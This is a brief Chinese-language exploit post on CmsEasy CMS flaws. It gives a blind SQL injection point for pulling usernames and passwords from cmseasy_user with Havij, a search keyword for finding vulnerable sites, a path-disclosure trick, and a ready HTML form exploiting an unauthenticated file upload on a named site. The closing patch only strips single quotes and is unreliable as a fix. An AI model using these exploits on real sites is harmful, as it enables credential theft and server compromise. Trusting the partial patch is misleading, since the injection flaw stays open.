注入漏洞

注入点：/celive/js/include.php?cmseasylive=1111&departmentid=0 类型：mysql blind—string 错误关键字：online.gif 表名：cmseasy_user 列明：userid,username,password 直接放Havij里面跑。错误关键字:online.gif 添加表名：cmseasy_user 列表：userid,username,password 关键字：Powered by CmsEasy

 

暴路径 ODAY

直接把爆路径 如：http://www.8090sec.com/index.php?case=archive

上传漏洞

Exp:

<form enctype=”multipart/form-data” method=”post” action=”http://www.8090sec.com/celive/live/doajaxfileupload.php”> <input type=”file” name=”fileToUpload”> <input type=”submit” value=”上传”> </form>

注入漏洞修复：

打开 /celive/js/include.php 文件,来到52行或此功能代码处

if (isset($_GET['departmentid'])) { $departmentid = $_GET['departmentid']; $activity_sql = “SELECT `id` FROM `”.$config['prefix'].”activity` WHERE `departmentid`=’”.$departmentid.”‘ AND `operatorid`=’”.$operatorid.”‘”; 将代码改为 if (isset($_GET['departmentid'])) { $departmentid = str_replace(“‘”,””,$_GET['departmentid']); $activity_sql = “SELECT `id` FROM `”.$config['prefix'].”activity` WHERE `departmentid`=’”.$departmentid.”‘ AND `operatorid`=’”.$operatorid.”‘”;